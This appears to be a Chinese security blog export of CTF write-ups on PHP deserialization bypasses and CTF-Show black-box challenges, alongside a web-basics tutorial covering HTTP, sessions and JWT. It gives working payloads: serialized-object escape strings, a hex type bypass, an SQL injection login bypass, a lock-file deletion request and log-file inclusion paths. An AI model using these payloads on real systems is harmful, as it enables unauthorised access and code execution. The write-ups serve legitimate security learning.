<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   print_r(unserialize(<span class="variable">$h</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="4">
<li>如果我们将上面的得到的内容进行 <code>反序列化输出</code>，结果将会报错；这是因为 <code>s:37:&quot;margin&quot;;</code> 这里按道理应该是 <code>s:6:&quot;margin&quot;;</code>，但由于我们需要按照上面的方法将后面的 <code>&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</code> 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度；</li>
<li>题目中的 filter 函数即是将 <code>secuer 替换为 secured</code> ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">实际上username的长度是<span class="number">186</span>，但是被替换之后成为</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样就补齐了</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post传参：   username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>password%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>hacker%<span class="number">22</span>;&#125;&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<h2 id="2-Just-Serizlize"><a href="#2-Just-Serizlize" class="headerlink" title="2 Just Serizlize"></a>2 Just Serizlize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = @unserialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>GET 传参 obj；</li>
<li>传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag；</li>
<li>hex 编码绕过 <code>if ($k !== &quot;flag&quot;) </code> ，把 s 换成 S；</li>
<li>表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值；</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$obj</span> = (<span class="keyword">object</span>)[<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">  <span class="variable">$obj</span>-&gt;Hh0 = &amp;<span class="variable">$obj</span>-&gt;flag;</span><br><span class="line">  <span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Hh0&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;asd&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Struggling</title>
    <url>/2021/11/07/Struggling/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/07/Aj7dS1eMpwxmlqH.jpg" alt="1636260982008"><img src="https://i.loli.net/2021/11/07/DUbOPSBcTtnlmCN.jpg" alt="IMG_20211029_205703"></p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>Web基础</title>
    <url>/2021/05/24/Web%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>攻击者攻击服务器–首先要保证两者之间能正常的进行通信<br>如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口<br>什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。</p>
<span id="more"></span>

<h2 id="一、访问网页流程"><a href="#一、访问网页流程" class="headerlink" title="一、访问网页流程"></a>一、访问网页流程</h2><h3 id="1-1-访问静态网页流程"><a href="#1-1-访问静态网页流程" class="headerlink" title="1.1 访问静态网页流程"></a>1.1 访问静态网页流程</h3><ul>
<li><p><strong>编写</strong>：HTML , CSS , JavaScript</p>
</li>
<li><p><strong>流程</strong>：在 浏 览 器 中 输 入h t t p : / / w w w . s e c u r i t y . c o m / a d m i n / i n d e x . h t m l 后 回 车，客户端向服务端发送HTTP请求报文，服务端通过运行其含有的Web应用服务器（Web容器，中间件）对接收到的请求进行处理–判断请求的文件扩展名，在网站的根目录之下寻找对应的文件，Web应用服务器再构建HTTP响应报文将文件源代码返回给浏览器，代码经过浏览器的渲染过后呈现的画面供客户端使用。</p>
</li>
</ul>
<h3 id="1-2-访问动态网页流程"><a href="#1-2-访问动态网页流程" class="headerlink" title="1.2 访问动态网页流程"></a>1.2 访问动态网页流程</h3><ul>
<li><p><strong>编写</strong>：.php , .jsp , .asp , .aspx ，一般 由HTML+CSS+JavaScript+后端语言代码组成。</p>
</li>
<li><p><strong>流程</strong>：判断请求文件扩展名之后，将会将对应的文件交给 <code>PHP脚本引擎</code> 去处理，使之解析文件当中的 PHP 代码，如果代码中涉及到队数据库的操作。它会请求相应的数据库，让数据库去执行队数据的增删改查等操作，然后将处理的结果返回给PHP脚本引擎。PHP脚本引擎将结果交给 Web 应用服务器（Apache），Web 应用服务器构建HTTP响应报文，由服务端发送给浏览器，经过解析之后，由客户端使用。</p>
</li>
<li><p><strong>数据库</strong>：SQL Server , MySQL , Oracle</p>
</li>
</ul>
<h2 id="二、Web应用基本架构"><a href="#二、Web应用基本架构" class="headerlink" title="二、Web应用基本架构"></a>二、Web应用基本架构</h2><p>Web应用程序的设计者、Web应用服务器、动态脚本引擎(服务端程序语言)、数据库</p>
<p>常见Web服务端架构：</p>
<p><img src="https://i.loli.net/2021/05/25/rDAOBg9jn8bZ7R4.png" alt="image-20210404084121968"></p>
<p>LAMP和WAMP就是Windows/Linux+Apache+PHP+MySQL</p>
<h2 id="三、URL"><a href="#三、URL" class="headerlink" title="三、URL"></a>三、URL</h2><p>URL：统一资源定位符（网页地址，网址），用于定位服务器的资源（文档，页面，图像等等）</p>
<ul>
<li><p><strong>标准格式 : protocol://userInfo@hostname[:port]/path/[?query]#fragment  真正访问的是@之后的地址</strong></p>
<ul>
<li><p>userInfo：user:password  不推荐</p>
</li>
<li><p><strong>井号</strong>：在URL中指定的是页面中的一个位置</p>
<p>井号作为 页面定位符 出现在URL中，比如：<em><a href="http://www.httpwatch.com/features.htm#print">http://www.httpwatch.com/features.htm#print</a></em> ，此URL表示在页面features.htm中print的位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。</p>
</li>
</ul>
</li>
<li><p><strong>URL编码：</strong></p>
<ul>
<li><p>产生原因：一些特殊字符会含有不同而含义：<code>?username=1&amp;passwd=2%263</code> ，为了区分。RFC标准提出 <code>URL编码方案</code></p>
</li>
<li><p>常见：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=  	%3d</span><br><span class="line">#	%23</span><br><span class="line">%	%25</span><br><span class="line">&amp;	%26</span><br><span class="line">/	%2f</span><br><span class="line">空格	%20</span><br><span class="line">换行	%0a</span><br><span class="line">空字节	%00</span><br><span class="line">加号 	+ 代表URL编码当中的 空格</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="四、HTTP"><a href="#四、HTTP" class="headerlink" title="四、HTTP"></a>四、HTTP</h2><p>HTTP （HyperText Transfer Protocol）超文本传输协议（请求/响应协议）：规定浏览器与万维网服务器之间的通信规则。<strong>无状态的协议</strong></p>
<h3 id="4-1-HTTP-协议报文"><a href="#4-1-HTTP-协议报文" class="headerlink" title="4.1 HTTP 协议报文"></a>4.1 HTTP 协议报文</h3><h4 id="4-1-1-请求报文"><a href="#4-1-1-请求报文" class="headerlink" title="4.1.1 请求报文"></a>4.1.1 请求报文</h4><ul>
<li><p>请求行 ：<code>请求方法 /URL /HTTP协议版本</code> 空格隔离</p>
</li>
<li><p>请求头部：告知服务器客户端请求的信息，<code>关键字:值</code>，每行一对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host				被请求资源的主机名</span><br><span class="line">User-Agent			产生请求的浏览器类型</span><br><span class="line">Accept				客户端可处理的 MIME 类型</span><br><span class="line">Accept-Encoding		客户端能够理解的内容编码方式</span><br><span class="line">Accept-Language		客户端可理解的语言</span><br><span class="line">Cookie				客户端身份凭证</span><br></pre></td></tr></table></figure>

<p><strong>Referer</strong></p>
<p>重定向时，声明用户从什么地方（上一个URL）到达现在的URL的。<br>例如：登陆页面，当用户登陆成功之后，HTTP请求报文中会有Referer字段–显示用户是从什么地方跳转到成功登录之后的界面的，服务端会进行检测，用于判断准确性。</p>
<p><strong>Post方式</strong>：经常会有 <code>Content-Type 和 Content-Length</code>字段</p>
</li>
<li><p>空行</p>
</li>
<li><p>请求的数据</p>
<ul>
<li>Get方式：没有请求正文，请求的数据在URL当中</li>
<li>Post方式：请求报文当中的最下面</li>
</ul>
</li>
</ul>
<h4 id="4-1-2-响应报文"><a href="#4-1-2-响应报文" class="headerlink" title="4.1.2 响应报文"></a>4.1.2 响应报文</h4><ul>
<li><p>状态行  ： <code>HTTP协议版本 状态码 状态描述</code> 空格隔离</p>
<ul>
<li><strong>状态码：</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1xx		信息--服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2xx		成功--操作成功被服务器接收并处理</span><br><span class="line">3xx		重定向--需要进一步操作才可完成请求</span><br><span class="line">4xx		客户端请求时错误</span><br><span class="line">5xx		服务端处理请求时错误</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>状态描述：</strong></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th align="center">状态描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">200</td>
<td align="center">OK</td>
<td align="center">请求成功</td>
</tr>
<tr>
<td align="center">304</td>
<td align="center">Not Modified</td>
<td align="center">直接使用本地缓存</td>
</tr>
<tr>
<td align="center">400</td>
<td align="center">Bad Request</td>
<td align="center">客户端请求语法错误，服务器无法理解</td>
</tr>
<tr>
<td align="center">401</td>
<td align="center">Unauthorized</td>
<td align="center">请求未经授权</td>
</tr>
<tr>
<td align="center">403</td>
<td align="center">Forbidden</td>
<td align="center">服务器收到请求但拒绝提供服务</td>
</tr>
<tr>
<td align="center">404</td>
<td align="center">Not Found</td>
<td align="center">请求资源不存在</td>
</tr>
<tr>
<td align="center">500</td>
<td align="center">Internal Server Error</td>
<td align="center">服务器发生了不可预知的错误</td>
</tr>
<tr>
<td align="center">503</td>
<td align="center">Server Unavaiable</td>
<td align="center">服务器当前无法处理客户端的请求</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>响应头部：描述服务器信息  <code>关键字:值</code>，每行一对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Date				请求发送的时间 日期</span><br><span class="line">Server				告知客户端服务器的名称与版本号</span><br><span class="line">Content-Type		响应正文的 MIME类型</span><br><span class="line">Content-Length		响应正文的长度</span><br><span class="line">Connection			告知客户端响应完成之后的连接状态</span><br><span class="line">Content-Encoding	Web服务器告诉浏览器使用的是哪种压缩方法</span><br><span class="line">Last-Modified		指定资源的最后修改时间与日期</span><br></pre></td></tr></table></figure></li>
<li><p>空行</p>
</li>
<li><p>响应正文</p>
</li>
</ul>
<h3 id="4-2-HTTP请求方法–8种"><a href="#4-2-HTTP请求方法–8种" class="headerlink" title="4.2 HTTP请求方法–8种"></a>4.2 HTTP请求方法–8种</h3><p>服务端根据不同的请求方法做出不同的响应</p>
<h4 id="GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT"><a href="#GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT" class="headerlink" title="GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT"></a>GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT</h4><ul>
<li><p>GET  ：URL当中发送，有长度限制</p>
</li>
<li><p>POST ：在HTTP请求正文当中发送，无长度大小限制，可传递大量数据。</p>
<p>一般用于更新资源信息，向服务器提交数据。例如：登录，注册，修改资料，上传文件等等</p>
</li>
</ul>
<p><strong>安全性：</strong>不安全，黑客可获取，修改通信内容，冒充他人身份</p>
<p><strong>解决：</strong>HTTPS协议（HyperText Transfer Prototol over Secure Socket Later）:在HTTP基础上加了 SSL/TLS层。</p>
<h2 id="五、会话技术"><a href="#五、会话技术" class="headerlink" title="五、会话技术"></a>五、会话技术</h2><p><strong>盗取 Cookie       会话劫持</strong></p>
<ul>
<li><p>产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了<strong>会话技术：Session , cookie</strong></p>
</li>
<li><p>**Cookie :  **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。</p>
<ul>
<li><strong>客户端第一次请求</strong>：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。</li>
<li><strong>客户端再次发送请求</strong>：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。</li>
</ul>
</li>
<li><p>**Session :   **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。</p>
<ul>
<li><strong>客户端第一次请求</strong>：创建 <code>SESSIONID</code> ；初始化超全局变量 <code>$_SESSION</code>；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 <code>将SESSIONID以SETCOOKIE的形式返回给客户端</code>，相当于 <code>将SESSIONID 写入 COOKIE 当中</code>。</li>
<li><strong>客户端再次发送请求</strong>：检测到 <code>客户端的COOKIE中的SESSIONID</code> ；初始化超全局变量<code>$_SESSION</code>；找到文件，反序列化读取数据存储到<code>$_SESSION</code>中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。</li>
</ul>
</li>
<li><p><strong>登陆判断：</strong></p>
<ul>
<li>用户成功登录之后，服务器通过 <code>SESSION机制</code> 将用户信息存储到服务端，并将 <code>SESSIONID</code> 以 <code>SETCOOKIE</code>  的形式返回给客户端。</li>
<li>用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。</li>
</ul>
</li>
</ul>
<h2 id="六、JWT-原理"><a href="#六、JWT-原理" class="headerlink" title="六、JWT 原理"></a>六、JWT 原理</h2><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JWT 原理</a></p>
<p>JSON Web Token，服务器认证之后，会生成一个 JSON对象，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用户每次与服务端通信的时候都要发回这个 JSON对象，服务器就通过这个对象来认证用户身份。为防止用户篡改数据，服务器在生成这个对象时，会加上一个 <code>签名</code>。</p>
<ul>
<li><strong>JWT 组成：</strong><code>Header.Payload.Signature</code><ul>
<li><strong>Header</strong>：头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</li>
<li><strong>Payload</strong>：载荷就是存放有效信息的地方，即用来存放实际需要传递的数据—标准中注册的声明，公共的声明，私有的声明</li>
<li><strong>Signature</strong>：这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web基础篇</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web应用基本架构</tag>
        <tag>HTTP</tag>
        <tag>会话技术</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-黑盒测试</title>
    <url>/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、黑盒测试"><a href="#一、黑盒测试" class="headerlink" title="一、黑盒测试"></a>一、黑盒测试</h1><h2 id="1-1-Web-380"><a href="#1-1-Web-380" class="headerlink" title="1.1 Web 380"></a>1.1 Web 380</h2><p>扫目录可以发现</p>
<p><img src="https://i.loli.net/2021/08/04/oQUxOMAecNVramB.png" alt="image-20210804135546210"></p>
<p><img src="https://i.loli.net/2021/08/04/PHiK79wfyUxTWGe.png" alt="image-20210804135326954"></p>
<p>尝试 ?id=2</p>
<p><img src="https://i.loli.net/2021/08/04/pgPURTNBjht75o6.png" alt="image-20210804135348176"></p>
<p>可以看到是 <code>file_get_contents</code> </p>
<p>那 <code>?id=flag</code> 尝试 ，查源码得到</p>
<h2 id="1-2-Web-381"><a href="#1-2-Web-381" class="headerlink" title="1.2 Web 381"></a>1.2 Web 381</h2><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210804135637994.png" alt="image-20210804135637994"></p>
<p>可以看到这里与之前不同，但是尝试访问过后，依旧不行</p>
<p>那继续扫，发现，仍然得到了 <code>page.php</code></p>
<p><img src="https://i.loli.net/2021/08/04/lC5HYPfB4xVj9DE.png" alt="image-20210804140001237"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1</span><br><span class="line">2 3 4</span><br><span class="line"><span class="comment"># 发现对应的是每一篇报道</span></span><br></pre></td></tr></table></figure>

<p>依次访问，最终无所获，且尝试过后 <code>page_flag.php</code> 应该也是不存在的</p>
<p>又回到最初发现的原密码目录，再次尝试，成功</p>
<p><img src="https://i.loli.net/2021/08/04/SrIFG9wsRJ6mzAQ.png" alt="image-20210804140511148"></p>
<h2 id="1-3-Web-382-383"><a href="#1-3-Web-382-383" class="headerlink" title="1.3 Web 382-383"></a>1.3 Web 382-383</h2><p>这次再直接访问过后，就是登录页面</p>
<p><img src="https://i.loli.net/2021/08/04/u5OVsHQIXcv7lBe.png" alt="image-20210804140652142"></p>
<p><strong>SQL 万能密码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username: admin<span class="string">&#x27;or&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/JTAzCBqfjY9sahW.png" alt="image-20210804140903548"></p>
<p><strong>密码爆破</strong></p>
<p><img src="https://i.loli.net/2021/08/04/DW685jRtagGKIeb.png" alt="image-20210804141939521"></p>
<h2 id="1-4-Web-384"><a href="#1-4-Web-384" class="headerlink" title="1.4 Web 384"></a>1.4 Web 384</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">密码前2位是小写字母，后三位是数字</span><br></pre></td></tr></table></figure>

<p>万能密码不可行，只能根据题目进行爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">		<span class="built_in">print</span>(i,j)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/GK4kNicyxXmhBvV.png" alt="image-20210804144019115"></p>
<h2 id="1-5-Web-385"><a href="#1-5-Web-385" class="headerlink" title="1.5 Web 385"></a>1.5 Web 385</h2><p>同样有后台登录，但是密码也没有提示，我们先不进行爆破</p>
<p>扫目录，有新的发现</p>
<p><img src="https://i.loli.net/2021/08/04/TtuqMYQVP65XOe9.png" alt="image-20210804144556248"></p>
<p><img src="https://i.loli.net/2021/08/04/qeb5Y4MXhUW29KP.png" alt="image-20210804144644455"></p>
<p><img src="https://i.loli.net/2021/08/04/sGpZi9luOXMehTP.png" alt="image-20210804144714402"></p>
<p>证明我们已经重置了密码，那么 所谓的 默认密码是多少呢？</p>
<p>不管是多少，肯定是弱密码，我们可以再进行爆破，也可以结合之前所爆破出来的密码尝试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin888</span><br></pre></td></tr></table></figure>

<h2 id="1-6-Web-386"><a href="#1-6-Web-386" class="headerlink" title="1.6 Web 386"></a>1.6 Web 386</h2><p>说是扫出来的 <code>clear.php</code> ，但是我 dirsearch 没有扫出来，说白了，还是字典不够强大</p>
<p><img src="https://i.loli.net/2021/08/04/XCiA4ofnjSg5YJM.png" alt="image-20210804145328318"></p>
<p>也就是说，我们需要首先清除掉 <code>lock.dat</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/clear.php?file=./install/lock.dat</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/FOypT7ZMeIN8i9U.png" alt="image-20210804150138828"></p>
<p>清理成功之后再次像上一关那样就好了</p>
<h2 id="1-7-Web-387"><a href="#1-7-Web-387" class="headerlink" title="1.7 Web 387"></a>1.7 Web 387</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">前面部分和386一样</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/jeDxClWqETONUgm.png" alt="image-20210804150816749"></p>
<p>说是和上一关一样，但是这次删不了，我们继续扫目录</p>
<p><img src="https://i.loli.net/2021/08/04/BS9COfTgGrAX2wY.png" alt="image-20210804150803918"></p>
<p><img src="https://i.loli.net/2021/08/04/gkam7jJ3xovDQ4Y.png" alt="image-20210804150901657"></p>
<p><img src="https://i.loli.net/2021/08/04/Ev3jVune7N5tgOb.png" alt="image-20210804150936797"></p>
<p>看来 robots.txt 也是用来提示我们 <code>/debug/</code> 的</p>
<p>尝试传递参数试试</p>
<p><img src="https://i.loli.net/2021/08/04/p4wzKtHeGEb8SuI.png" alt="image-20210804151150834"></p>
<p><img src="https://i.loli.net/2021/08/04/jRNg9zqTElSA6iP.png" alt="image-20210804151227962"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line">?file=/flag</span><br><span class="line"><span class="comment">#等等都查不出来</span></span><br></pre></td></tr></table></figure>

<p>那么，进行日志包含</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>然后抓包修改，写入命令</p>
<p><img src="https://i.loli.net/2021/08/04/JEI8PWZ9qznGy4o.png" alt="image-20210804151954242"></p>
<p>只在当前页面发现了一个 <code>index.php</code></p>
